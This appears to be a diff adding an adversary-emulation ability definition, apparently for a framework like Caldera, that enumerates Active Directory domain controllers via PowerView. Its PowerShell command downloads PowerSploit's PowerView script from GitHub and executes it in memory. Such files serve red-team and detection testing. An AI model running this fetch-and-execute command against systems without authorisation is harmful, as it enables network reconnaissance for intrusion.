@@ -1,0 +1,23 @@
+---
+- id: aaeee9107989a507f526b0cef1cb274f
+  name: Get-DomainController with PowerView
+  description: 'Utilizing PowerView, run Get-DomainController to identify the Domain
+    Controller. Upon execution, information about the domain controller within the
+    domain will be displayed.
+
+    '
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: Remote System Discovery
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1''
+          -UseBasicParsing); Get-DomainController -verbose'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
